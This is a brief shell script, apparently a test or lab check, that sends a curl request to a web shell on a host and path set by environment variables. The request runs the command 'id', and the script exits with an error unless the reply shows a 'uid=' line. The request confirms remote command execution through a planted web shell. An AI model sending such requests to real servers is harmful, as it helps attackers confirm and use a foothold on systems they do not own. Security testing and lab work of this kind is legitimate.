set -eu
out=$(curl -fsS "http://${BOX_HOST}:8084/${BOX_PATH}/run?cmd=id")
echo "$out"
echo "$out" | grep -q 'uid=' || { echo "web shell did not execute" >&2; exit 1; }
